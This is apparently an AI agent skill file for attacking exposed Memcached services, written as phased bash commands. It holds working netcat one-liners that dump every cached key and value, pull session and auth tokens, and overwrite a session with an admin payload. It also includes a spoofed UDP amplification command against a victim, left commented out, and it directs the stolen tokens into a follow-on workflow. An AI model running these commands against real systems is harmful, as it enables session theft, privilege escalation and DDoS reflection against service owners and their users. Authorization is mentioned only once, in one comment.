---
name: tech-memcached
description: "Memcached security testing — unauthenticated access, cache poisoning, session hijacking, data extraction, DDoS amplification, memcached stats enumeration. Triggers: 'memcached', 'memcached security', 'memcached pentest', 'memcached unauth', 'cache poisoning', 'memcached exploit', 'memcached session', 'memcached amplification'."
---

# Memcached Security Testing

Enumerate and exploit exposed Memcached services.

---

## Phase 1: Discovery & Authentication

```bash
TARGET="TARGET_IP"

# Detect Memcached:
nmap -p 11211 -sV "$TARGET" 2>/dev/null
nc "$TARGET" 11211 << 'EOF'
stats
EOF

# Direct stats query:
echo "stats" | nc -q 1 "$TARGET" 11211 | tee output/memcached_stats.txt

# Version and config:
echo "version" | nc -q 1 "$TARGET" 11211
echo "stats settings" | nc -q 1 "$TARGET" 11211 | tee output/memcached_settings.txt
```

---

## Phase 2: Data Extraction

```bash
TARGET="TARGET_IP"

# Get all cached keys (Memcached 1.4.31+):
echo "lru_crawler metadump all" | nc -q 2 "$TARGET" 11211 | tee output/memcached_keys.txt

# Legacy key extraction (stats cachedump):
SLABS=$(echo "stats slabs" | nc -q 1 "$TARGET" 11211 | awk '/STAT [0-9]+:chunk_size/{print $2}' | cut -d: -f1)
for SLAB in $SLABS; do
  echo "stats cachedump $SLAB 100" | nc -q 1 "$TARGET" 11211 | grep "ITEM" | awk '{print $2}'
done | tee output/memcached_all_keys.txt

# Get specific key:
echo "get SESSION_KEY" | nc -q 1 "$TARGET" 11211

# Get all keys + values:
while IFS= read -r KEY; do
  echo -n "$KEY → "
  echo "get $KEY" | nc -q 1 "$TARGET" 11211 | tail -2 | head -1
done < output/memcached_all_keys.txt | tee output/memcached_dump.txt
```

---

## Phase 3: Session Hijacking

```bash
TARGET="TARGET_IP"

# Find session keys:
grep -i "session\|auth\|token\|user" output/memcached_all_keys.txt | tee output/memcached_session_keys.txt

# Dump session data:
for KEY in $(cat output/memcached_session_keys.txt); do
  echo "=== $KEY ==="
  echo "get $KEY" | nc -q 1 "$TARGET" 11211 | grep -v "^(END|VALUE|DELETED)" | head -3
done | tee output/memcached_sessions.txt

# Overwrite session (if write enabled):
echo "set SESSION_KEY 0 0 50" | nc -q 1 "$TARGET" 11211
echo '{"uid":1,"admin":true,"username":"admin"}' | nc -q 1 "$TARGET" 11211
```

---

## Phase 4: DDoS Amplification Check

```bash
TARGET="TARGET_IP"

# Test amplification factor:
echo "stats" | nc -q 1 "$TARGET" 11211 | wc -c
# If >> 100 bytes returned for 5-byte request: amplification possible

# Reflected UDP amplification (do NOT use against live targets without authorization):
# hping3 --udp --spoof VICTIM_IP -p 11211 "$TARGET" --data "stats"
```

---

## Output

Save to `output/`:
- `memcached_stats.txt` — service statistics
- `memcached_all_keys.txt` — all cached keys
- `memcached_sessions.txt` — session data found

## Next Phase

→ Use extracted session tokens to `vuln-auth-workflow`
→ `pentest-report` to document Memcached exposure
